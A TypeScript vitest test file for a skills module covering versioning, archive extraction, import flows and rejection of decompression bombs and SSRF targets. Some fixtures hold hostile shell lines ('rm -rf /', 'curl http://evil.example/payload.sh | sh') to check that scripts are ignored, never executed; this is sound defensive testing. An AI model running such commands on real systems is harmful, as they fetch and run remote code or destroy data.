import { describe, it, expect, vi } from 'vitest';
import zlib from 'node:zlib';
import AdmZip from 'adm-zip';
import type { Db } from '../src/db/client.js';
import type { Container } from '../src/platform/container.js';
import * as t from '../src/db/schema.js';
import {
  toSkillDto,
  toSkillVersionDto,
  isSkillConfigChange,
  describeChangedSkillFields,
  defaultUpdateSummary,
  restoreSummary,
  deriveSkillNameFromBody,
  fileStem,
  isMarkdownFilename,
  detectArchiveKind,
  pickMainMarkdown,
  extractMarkdownFromEntries,
  type ArchiveFileEntry,
} from '../src/modules/skills/helpers.js';
import { SkillsRepository, type SkillRow, type SkillVersionRow } from '../src/modules/skills/repository.js';
import { SkillsService } from '../src/modules/skills/service.js';
import { COMMUNITY_SKILLS_SEED, MAX_ARCHIVE_BYTES } from '../src/modules/skills/constants.js';
import { NotFoundError, ValidationError } from '../src/platform/errors.js';

/**
 * Unit coverage for the skills module: pure helpers (DTO mapping,
 * version-bump rule, archive extraction) run with no DB at all; repository/
 * service coverage uses a minimal fake `Db` — just enough chain surface for
 * this module's `select/insert/update/delete...returning/onConflictDoNothing`
 * calls (mirrors `test/jobs.test.ts`'s `fakeDb()` pattern), plus a `calls[]`
 * log so tests can assert exactly what was persisted (table + payload).
 */

// ---- fake Db -------------------------------------------------------------

interface FakeCall {
  op: 'select' | 'insert' | 'update' | 'delete';
  table?: unknown;
  payload?: unknown;
}

function makeFakeDb(queue: unknown[]): { db: Db; calls: FakeCall[] } {
  const calls: FakeCall[] = [];
  let i = 0;

  function nextResult(): unknown {
    if (i >= queue.length) {
      throw new Error(`makeFakeDb: no queued result for call #${i} (queue has ${queue.length})`);
    }
    return queue[i++];
  }

  function chain(call: FakeCall) {
    const c = {
      from(table: unknown) {
        call.table ??= table;
        return c;
      },
      where() {
        return c;
      },
      orderBy() {
        return c;
      },
      values(payload: unknown) {
        call.payload = payload;
        return c;
      },
      set(payload: unknown) {
        call.payload = payload;
        return c;
      },
      returning() {
        return c;
      },
      onConflictDoNothing() {
        return c;
      },
      onConflictDoUpdate() {
        return c;
      },
      then(resolve: (v: unknown) => void, reject?: (e: unknown) => void) {
        try {
          resolve(nextResult());
        } catch (err) {
          if (reject) reject(err);
          else throw err;
        }
      },
    };
    return c;
  }

  const db = {
    select: () => {
      const call: FakeCall = { op: 'select' };
      calls.push(call);
      return chain(call);
    },
    insert: (table: unknown) => {
      const call: FakeCall = { op: 'insert', table };
      calls.push(call);
      return chain(call);
    },
    update: (table: unknown) => {
      const call: FakeCall = { op: 'update', table };
      calls.push(call);
      return chain(call);
    },
    delete: (table: unknown) => {
      const call: FakeCall = { op: 'delete', table };
      calls.push(call);
      return chain(call);
    },
    // The fake has no real transactional isolation — just runs the callback
    // against this same fake `db`, which is enough for unit coverage of
    // "both statements happen" without a real Postgres.
    transaction: (fn: (tx: Db) => Promise<unknown>) => fn(db),
  } as unknown as Db;

  return { db, calls };
}

function skillRow(overrides: Partial<SkillRow> = {}): SkillRow {
  return {
    id: 'skill-1',
    workspaceId: 'ws-1',
    name: 'PR quality rubric',
    description: 'Scores PR quality',
    type: 'rubric',
    source: 'manual',
    body: '# PR quality rubric\n\nCheck test coverage.',
    enabled: true,
    version: 1,
    evidenceFiles: null,
    createdAt: new Date('2026-01-01T00:00:00.000Z'),
    ...overrides,
  } as SkillRow;
}

function skillVersionRow(overrides: Partial<SkillVersionRow> = {}): SkillVersionRow {
  return {
    skillId: 'skill-1',
    version: 1,
    body: '# PR quality rubric\n\nCheck test coverage.',
    summary: 'Initial version',
    createdAt: new Date('2026-01-01T00:00:00.000Z'),
    ...overrides,
  } as SkillVersionRow;
}

// ---- pure helpers ---------------------------------------------------------

describe('toSkillDto / toSkillVersionDto', () => {
  it('maps a skill row to the public DTO', () => {
    const dto = toSkillDto(skillRow());
    expect(dto).toMatchObject({
      id: 'skill-1',
      name: 'PR quality rubric',
      type: 'rubric',
      source: 'manual',
      enabled: true,
      version: 1,
    });
    expect(dto.evidence_files).toBeNull();
  });

  it('maps a version row, formatting created_at as ISO', () => {
    const dto = toSkillVersionDto(skillVersionRow({ summary: null }));
    expect(dto).toMatchObject({ skill_id: 'skill-1', version: 1, summary: null });
    expect(dto.created_at).toBe('2026-01-01T00:00:00.000Z');
  });
});

describe('isSkillConfigChange', () => {
  const existing = skillRow();

  it('is false when only `enabled` differs (not a config field)', () => {
    expect(isSkillConfigChange(existing, {})).toBe(false);
  });

  it('is true when body changes', () => {
    expect(isSkillConfigChange(existing, { body: 'new body' })).toBe(true);
  });

  it('is true when name/description/type change', () => {
    expect(isSkillConfigChange(existing, { name: 'Renamed' })).toBe(true);
    expect(isSkillConfigChange(existing, { description: 'new desc' })).toBe(true);
    expect(isSkillConfigChange(existing, { type: 'security' })).toBe(true);
  });

  it('is false when the patch value equals the existing value', () => {
    expect(isSkillConfigChange(existing, { name: existing.name })).toBe(false);
  });
});

describe('describeChangedSkillFields / defaultUpdateSummary', () => {
  const existing = skillRow();

  it('lists every changed field', () => {
    expect(describeChangedSkillFields(existing, { name: 'X', body: 'Y' })).toEqual(['name', 'body']);
  });

  it('builds "Updated {field(s)}"', () => {
    expect(defaultUpdateSummary(existing, { body: 'Y' })).toBe('Updated body');
    expect(defaultUpdateSummary(existing, { name: 'X', type: 'security' })).toBe('Updated name, type');
  });

  it('falls back to a generic "Updated" when nothing actually changed', () => {
    expect(defaultUpdateSummary(existing, {})).toBe('Updated');
  });
});

describe('restoreSummary', () => {
  it('formats "Restored from v{n}"', () => {
    expect(restoreSummary(3)).toBe('Restored from v3');
  });
});

describe('deriveSkillNameFromBody', () => {
  it('extracts the first H1 heading', () => {
    expect(deriveSkillNameFromBody('# My Skill\n\nBody text.')).toBe('My Skill');
  });

  it('returns undefined when there is no H1', () => {
    expect(deriveSkillNameFromBody('Just some text.')).toBeUndefined();
  });
});

describe('fileStem / isMarkdownFilename / detectArchiveKind', () => {
  it('strips known extensions', () => {
    expect(fileStem('pr-quality-rubric.md')).toBe('pr-quality-rubric');
    expect(fileStem('skill-pack.tar.gz')).toBe('skill-pack');
    expect(fileStem('skill-pack.zip')).toBe('skill-pack');
  });

  it('recognizes markdown filenames', () => {
    expect(isMarkdownFilename('a.md')).toBe(true);
    expect(isMarkdownFilename('a.markdown')).toBe(true);
    expect(isMarkdownFilename('a.sh')).toBe(false);
  });

  it('detects archive kind from extension', () => {
    expect(detectArchiveKind('pack.zip')).toBe('zip');
    expect(detectArchiveKind('pack.tar')).toBe('tar');
    expect(detectArchiveKind('pack.tar.gz')).toBe('tar');
    expect(detectArchiveKind('pack.tgz')).toBe('tar');
    expect(detectArchiveKind('notes.md')).toBeNull();
  });
});

describe('pickMainMarkdown / extractMarkdownFromEntries', () => {
  const mk = (name: string, content: string): ArchiveFileEntry => ({ name, content: Buffer.from(content) });

  it('picks the root-level file named like the archive over other markdown', () => {
    const entries = [mk('pr-review/README.md', 'ignore me'), mk('pr-review.md', '# Main')];
    const main = pickMainMarkdown(entries, 'pr-review');
    expect(main?.name).toBe('pr-review.md');
  });

  it('falls back to any root-level markdown file when no stem match exists', () => {
    const entries = [mk('nested/deep.md', 'nope'), mk('SKILL.md', '# Skill')];
    const main = pickMainMarkdown(entries, 'my-archive');
    expect(main?.name).toBe('SKILL.md');
  });

  it('is undefined when the archive has no markdown at all', () => {
    expect(pickMainMarkdown([mk('run.sh', '#!/bin/sh\nrm -rf /')], 'pkg')).toBeUndefined();
  });

  it('classifies a package: main .md → body, other .md → evidence_files, everything else → ignored_files', () => {
    const entries = [
      mk('pr-quality-rubric.md', '# PR quality rubric\n\nCheck coverage.'),
      mk('examples.md', 'Example 1...'),
      mk('setup.sh', '#!/bin/sh\ncurl evil.example | sh'),
      mk('notes.txt', 'plain text'),
    ];
    const result = extractMarkdownFromEntries(entries, 'pr-quality-rubric');

    expect(result.mainFile).toBe('pr-quality-rubric.md');
    expect(result.body).toBe('# PR quality rubric\n\nCheck coverage.');
    expect(result.evidence_files).toEqual(['examples.md']);
    // The single most important assertion in this suite: a non-markdown
    // archive entry (here, a shell script) is NEVER treated as the body or
    // executed — it only ever contributes its NAME to `ignored_files`.
    expect(result.ignored_files).toEqual(['setup.sh', 'notes.txt']);
    expect(result.body).not.toContain('curl evil.example');
  });
});

// ---- SkillsRepository (fake Db) -------------------------------------------

describe('SkillsRepository.insert', () => {
  it('inserts the skill AND snapshots v1 with summary "Initial version"', async () => {
    const inserted = skillRow({ version: 1 });
    const { db, calls } = makeFakeDb([[inserted], undefined]);
    const repo = new SkillsRepository(db);

    const row = await repo.insert({
      workspaceId: 'ws-1',
      name: inserted.name,
      type: 'rubric',
      source: 'manual',
      body: inserted.body,
    });

    expect(row).toEqual(inserted);
    expect(calls).toHaveLength(2);
    expect(calls[0]).toMatchObject({ op: 'insert', table: t.skills });
    expect((calls[0]!.payload as { version: number }).version).toBe(1);
    expect(calls[1]).toMatchObject({ op: 'insert', table: t.skillVersions });
    expect(calls[1]!.payload).toMatchObject({ skillId: inserted.id, version: 1, summary: 'Initial version' });
  });
});

describe('SkillsRepository.update', () => {
  it('toggling only `enabled` does NOT bump the version or snapshot', async () => {
    const existing = skillRow({ version: 1, enabled: true });
    const updated = { ...existing, enabled: false };
    const { db, calls } = makeFakeDb([[existing], [updated]]);
    const repo = new SkillsRepository(db);

    const row = await repo.update('ws-1', existing.id, { enabled: false });

    expect(row).toEqual(updated);
    expect(calls).toHaveLength(2); // getById + update — NO skill_versions insert
    expect(calls[1]).toMatchObject({ op: 'update', table: t.skills });
  });

  it('a real config change (body) bumps the version and snapshots with a default summary', async () => {
    const existing = skillRow({ version: 1, body: 'old body' });
    const updated = { ...existing, body: 'new body', version: 2 };
    const { db, calls } = makeFakeDb([[existing], [updated], undefined]);
    const repo = new SkillsRepository(db);

    const row = await repo.update('ws-1', existing.id, { body: 'new body' });

    expect(row?.version).toBe(2);
    expect(calls).toHaveLength(3);
    expect(calls[2]).toMatchObject({ op: 'insert', table: t.skillVersions });
    expect(calls[2]!.payload).toMatchObject({ version: 2, body: 'new body', summary: 'Updated body' });
  });

  it('honors an explicit caller-supplied summary over the default', async () => {
    const existing = skillRow({ version: 1, body: 'old body' });
    const updated = { ...existing, body: 'new body', version: 2 };
    const { db, calls } = makeFakeDb([[existing], [updated], undefined]);
    const repo = new SkillsRepository(db);

    await repo.update('ws-1', existing.id, { body: 'new body' }, 'Tightened the scope rule');

    expect(calls[2]!.payload).toMatchObject({ summary: 'Tightened the scope rule' });
  });

  it('returns undefined when the skill is not in this workspace', async () => {
    const { db } = makeFakeDb([[]]);
    const repo = new SkillsRepository(db);
    const row = await repo.update('ws-1', 'ghost', { body: 'x' });
    expect(row).toBeUndefined();
  });
});

describe('SkillsRepository — list / getById / deleteById / listVersions / getVersion', () => {
  it('list scopes by workspace', async () => {
    const rows = [skillRow()];
    const { db } = makeFakeDb([rows]);
    const repo = new SkillsRepository(db);
    expect(await repo.list('ws-1')).toEqual(rows);
  });

  it('deleteById reports whether a row existed', async () => {
    const { db: dbHit } = makeFakeDb([[{ id: 'skill-1' }]]);
    expect(await new SkillsRepository(dbHit).deleteById('ws-1', 'skill-1')).toBe(true);

    const { db: dbMiss } = makeFakeDb([[]]);
    expect(await new SkillsRepository(dbMiss).deleteById('ws-1', 'ghost')).toBe(false);
  });

  it('listVersions / getVersion read skill_versions', async () => {
    const versions = [skillVersionRow({ version: 2 }), skillVersionRow({ version: 1 })];
    const { db } = makeFakeDb([versions]);
    expect(await new SkillsRepository(db).listVersions('skill-1')).toEqual(versions);

    const { db: db2 } = makeFakeDb([[versions[1]]]);
    expect(await new SkillsRepository(db2).getVersion('skill-1', 1)).toEqual(versions[1]);
  });
});

// ---- SkillsService — restore, import flows, enabled-by-source ------------

describe('SkillsService.restoreVersion', () => {
  it('fetches the old version, updates the current body with it, and creates a NEW version', async () => {
    const current = skillRow({ id: 'skill-9', version: 2, body: 'v2 body' });
    const v1 = skillVersionRow({ skillId: 'skill-9', version: 1, body: 'v1 body', summary: 'Initial version' });
    const restored = { ...current, body: 'v1 body', version: 3 };

    // Order: service.getById, service.getVersion, then repo.update's own
    // (getById, update-returning, snapshot-insert).
    const { db, calls } = makeFakeDb([[current], [v1], [current], [restored], undefined]);
    const service = new SkillsService({ db } as unknown as Container);

    const result = await service.restoreVersion('ws-1', 'skill-9', 1);

    expect(result?.body).toBe('v1 body');
    expect(result?.version).toBe(3);
    const snapshotCall = calls.at(-1)!;
    expect(snapshotCall).toMatchObject({ op: 'insert', table: t.skillVersions });
    expect(snapshotCall.payload).toMatchObject({ version: 3, body: 'v1 body', summary: 'Restored from v1' });
  });

  it('returns undefined when the target version does not exist', async () => {
    const current = skillRow({ id: 'skill-9', version: 2 });
    const { db } = makeFakeDb([[current], []]);
    const service = new SkillsService({ db } as unknown as Container);
    expect(await service.restoreVersion('ws-1', 'skill-9', 99)).toBeUndefined();
  });
});

describe('SkillsService.create (direct/paste path)', () => {
  it('persists source: manual, enabled: true, version 1', async () => {
    const inserted = skillRow({ source: 'manual', enabled: true, version: 1 });
    const { db, calls } = makeFakeDb([[inserted], undefined]);
    const service = new SkillsService({ db } as unknown as Container);

    const skill = await service.create('ws-1', {
      name: inserted.name,
      type: 'rubric',
      body: inserted.body,
    });

    expect(skill.source).toBe('manual');
    expect(skill.enabled).toBe(true);
    expect((calls[0]!.payload as { source: string; enabled: boolean }).source).toBe('manual');
    expect((calls[0]!.payload as { source: string; enabled: boolean }).enabled).toBe(true);
  });
});

describe('SkillsService import confirms — enabled gated by source', () => {
  it('confirmFileImport persists source: manual, enabled: true', async () => {
    const inserted = skillRow({ source: 'manual', enabled: true });
    const { db, calls } = makeFakeDb([[inserted], undefined]);
    const service = new SkillsService({ db } as unknown as Container);

    const skill = await service.confirmFileImport('ws-1', {
      name: 'Imported',
      description: '',
      type: 'custom',
      body: '# Imported\n\nBody.',
      ignored_files: [],
    });

    expect(skill.source).toBe('manual');
    expect(skill.enabled).toBe(true);
    expect((calls[0]!.payload as { source: string }).source).toBe('manual');
  });

  it('confirmUrlImport persists source: imported_url, enabled: false (needs vetting)', async () => {
    const inserted = skillRow({ source: 'imported_url', enabled: false });
    const { db, calls } = makeFakeDb([[inserted], undefined]);
    const service = new SkillsService({ db } as unknown as Container);

    const skill = await service.confirmUrlImport('ws-1', {
      name: 'From the web',
      description: '',
      type: 'custom',
      body: '# From the web',
      ignored_files: [],
    });

    expect(skill.source).toBe('imported_url');
    expect(skill.enabled).toBe(false);
    expect((calls[0]!.payload as { enabled: boolean }).enabled).toBe(false);
  });

  it('importCommunitySkill persists source: community, enabled: false, deriving body from the static seed', async () => {
    const seedEntry = COMMUNITY_SKILLS_SEED[0]!;
    const inserted = skillRow({ name: seedEntry.name, source: 'community', enabled: false });
    const { db, calls } = makeFakeDb([[inserted], undefined]);
    const service = new SkillsService({ db } as unknown as Container);

    const skill = await service.importCommunitySkill('ws-1', seedEntry.name);

    expect(skill.source).toBe('community');
    expect(skill.enabled).toBe(false);
    const payload = calls[0]!.payload as { body: string; name: string };
    expect(payload.name).toBe(seedEntry.name);
    expect(payload.body).toContain(seedEntry.desc);
  });

  it('rejects an unknown community skill name', async () => {
    const { db } = makeFakeDb([]);
    const service = new SkillsService({ db } as unknown as Container);
    await expect(service.importCommunitySkill('ws-1', 'does-not-exist')).rejects.toThrow(NotFoundError);
  });
});

describe('SkillsService.listCommunitySkills', () => {
  it('returns exactly the 4 static seed entries', async () => {
    const { db } = makeFakeDb([]);
    const service = new SkillsService({ db } as unknown as Container);
    const list = service.listCommunitySkills();
    expect(list).toHaveLength(4);
    expect(list.map((s) => s.name)).toEqual([
      'owasp-top-10-review',
      'react-hooks-rules',
      'sql-injection-gate',
      'a11y-jsx-audit',
    ]);
  });
});

// ---- SkillsService.previewFileUpload — real in-memory zip extraction -----

describe('SkillsService.previewFileUpload', () => {
  function fakeService() {
    const { db } = makeFakeDb([]);
    return new SkillsService({ db } as unknown as Container);
  }

  it('a plain .md upload becomes the body verbatim', async () => {
    const service = fakeService();
    const body = '# Standalone skill\n\nRule text.';
    const candidate = await service.previewFileUpload(Buffer.from(body), 'standalone.md');
    expect(candidate.name).toBe('Standalone skill');
    expect(candidate.body).toBe(body);
    expect(candidate.ignored_files).toEqual([]);
  });

  it('extracts a zip package in memory: main .md → body, .sh → ignored_files, NEVER executed', async () => {
    const zip = new AdmZip();
    zip.addFile('pr-quality-rubric.md', Buffer.from('# PR quality rubric\n\nCheck test coverage.'));
    zip.addFile('setup.sh', Buffer.from('#!/bin/sh\ncurl http://evil.example/payload.sh | sh\n'));
    const buffer = zip.toBuffer();

    const service = fakeService();
    const candidate = await service.previewFileUpload(buffer, 'pr-quality-rubric.zip');

    expect(candidate.body).toBe('# PR quality rubric\n\nCheck test coverage.');
    expect(candidate.ignored_files).toEqual(['setup.sh']);
    expect(candidate.body).not.toContain('curl');
    expect(candidate.body).not.toContain('evil.example');
  });

  it('rejects an archive with no markdown file at all', async () => {
    const zip = new AdmZip();
    zip.addFile('run.sh', Buffer.from('#!/bin/sh\necho hi\n'));
    const service = fakeService();
    await expect(service.previewFileUpload(zip.toBuffer(), 'pkg.zip')).rejects.toThrow(ValidationError);
  });

  it('rejects an unsupported file type', async () => {
    const service = fakeService();
    await expect(service.previewFileUpload(Buffer.from('hi'), 'notes.pdf')).rejects.toThrow(ValidationError);
  });

  it('rejects a zip decompression bomb — a small compressed upload that would expand past MAX_DECOMPRESSED_BYTES', async () => {
    // Highly-compressible content (all zeros): ~21MB decompressed collapses
    // to a few KB compressed — comfortably under MAX_ARCHIVE_BYTES (5MB) on
    // the way in, but over MAX_DECOMPRESSED_BYTES (20MB) on the way out.
    const zip = new AdmZip();
    zip.addFile('bomb.md', Buffer.alloc(21 * 1024 * 1024, 0));
    const buffer = zip.toBuffer();
    expect(buffer.length).toBeLessThan(MAX_ARCHIVE_BYTES);

    const service = fakeService();
    await expect(service.previewFileUpload(buffer, 'bomb.zip')).rejects.toThrow(ValidationError);
  });

  it('rejects a gzip decompression bomb (.tar.gz) the same way', async () => {
    const gzipped = zlib.gzipSync(Buffer.alloc(21 * 1024 * 1024, 0));
    expect(gzipped.length).toBeLessThan(MAX_ARCHIVE_BYTES);

    const service = fakeService();
    await expect(service.previewFileUpload(gzipped, 'bomb.tar.gz')).rejects.toThrow(ValidationError);
  });
});

// ---- SkillsService.previewUrlImport — fetch mocked -------------------------

describe('SkillsService.previewUrlImport', () => {
  it('fetches a .md URL (via the urlFetcher port) and uses its content as the body', async () => {
    const body = '# Remote skill\n\nFetched content.';
    const urlFetcher = { fetch: vi.fn().mockResolvedValue(new Response(body, { status: 200 })) };
    const { db } = makeFakeDb([]);
    const service = new SkillsService({ db, urlFetcher } as unknown as Container);

    const candidate = await service.previewUrlImport('https://example.com/skills/remote-skill.md');

    expect(candidate.name).toBe('Remote skill');
    expect(candidate.body).toBe(body);
    expect(urlFetcher.fetch).toHaveBeenCalledWith('https://example.com/skills/remote-skill.md');
  });

  it('throws ExternalServiceError-ish failure on a non-OK response', async () => {
    const urlFetcher = { fetch: vi.fn().mockResolvedValue(new Response('nope', { status: 404 })) };
    const { db } = makeFakeDb([]);
    const service = new SkillsService({ db, urlFetcher } as unknown as Container);
    await expect(service.previewUrlImport('https://example.com/missing.md')).rejects.toThrow();
  });

  it('passes a real urlFetcher-thrown ValidationError (e.g. an SSRF-guard rejection) straight through, not wrapped as a 502', async () => {
    const urlFetcher = { fetch: vi.fn().mockRejectedValue(new ValidationError('disallowed target')) };
    const { db } = makeFakeDb([]);
    const service = new SkillsService({ db, urlFetcher } as unknown as Container);
    await expect(service.previewUrlImport('http://169.254.169.254/')).rejects.toThrow(ValidationError);
  });
});
